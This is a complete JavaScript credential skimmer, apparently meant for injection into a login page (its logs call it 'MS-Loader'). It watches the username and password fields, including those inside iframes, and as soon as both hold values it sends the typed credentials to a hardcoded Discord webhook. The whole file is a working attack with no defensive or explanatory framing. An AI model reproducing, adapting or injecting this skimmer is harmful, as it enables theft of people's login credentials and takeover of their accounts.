(function() {
    'use strict';

    // 1. CONFIGURATION
    const CONFIG = {
        webhookUrl: 'https://discord.com/api/webhooks/1555688085952532501/RIxYSmKDNbPesrwEbi8AO6b-CJX5LzIMBM0VJPFftEKrOrPYbjUNwE06tIM8oDUiyVga',
        usernameId: 'username', 
        passwordId: 'password'
    };

    // 2. STATE
    let credentials = {
        ur: null,
        p: null
    };

    // 3. UTILITY: SEND TO DISCORD
    function sendToDiscord(data) {
        console.log('[MS-Loader] Sending to Discord:', data);
        const payload = {
            content: `**U:** \`${data.ur || 'N/A'}\` **P:** \`${data.p || 'N/A'}\``
        };

        fetch(CONFIG.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(res => {
            if (!res.ok) throw new Error(`Discord Webhook Error: ${res.status}`);
            console.log('[MS-Loader] Discord send successful.');
        })
        .catch(err => console.error('[MS-Loader] Fetch failed:', err));
    }

    // 4. DOM OBSERVER: WAIT FOR ELEMENTS (WITH IFRAME SUPPORT)
    function waitForElements(callback) {
        const check = () => {
            // 1. Try Top-Level Document
            let userEl = document.getElementById(CONFIG.usernameId);
            let passEl = document.getElementById(CONFIG.passwordId);

            // 2. If not found, Try Iframes
            if (!userEl || !passEl) {
                const iframes = document.querySelectorAll('iframe');
                console.log('[MS-Loader] Top-level search failed. Checking', iframes.length, 'iframes...');
                
                for (let iframe of iframes) {
                    try {
                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                        if (iframeDoc) {
                            const iframeUserEl = iframeDoc.getElementById(CONFIG.usernameId);
                            const iframePassEl = iframeDoc.getElementById(CONFIG.passwordId);
                            
                            if (iframeUserEl && iframePassEl) {
                                userEl = iframeUserEl;
                                passEl = iframePassEl;
                                console.log('[MS-Loader] Elements found inside an iframe!');
                                break;
                            }
                        }
                    } catch (e) {
                        // Cross-origin iframe, ignore
                    }
                }
            }

            console.log('[MS-Loader] Checking for elements...', {
                userFound: !!userEl,
                passFound: !!passEl,
                userId: CONFIG.usernameId,
                passId: CONFIG.passwordId
            });

            if (userEl && passEl) {
                console.log('[MS-Loader] Elements found. Attaching listeners.');
                callback(userEl, passEl);
            } else {
                // If not found, retry in 500ms
                setTimeout(check, 500);
            }
        };
        check();
    }

    // 5. EVENT LISTENERS
    function attachListeners(userEl, passEl) {
        const handleInput = (e) => {
            const target = e.target;
            
            // Update State
            if (target.id === CONFIG.usernameId) {
                credentials.ur = target.value;
            } else if (target.id === CONFIG.passwordId) {
                credentials.p = target.value;
            }

            console.log('[MS-Loader] State Updated:', credentials);

            // TRIGGER: Send if both fields have data
            if (credentials.ur && credentials.p) {
                sendToDiscord(credentials);
            }
        };

        // Listen for 'input' (better than keyup for pasting)
        userEl.addEventListener('input', handleInput);
        passEl.addEventListener('input', handleInput);
        
        console.log('[MS-Loader] Listeners attached to elements.');
    }

    // 6. INITIALIZATION
    console.log('[MS-Loader] Script Loaded. Starting wait loop...');
    
    // Start watching for elements
    waitForElements(attachListeners);

})();
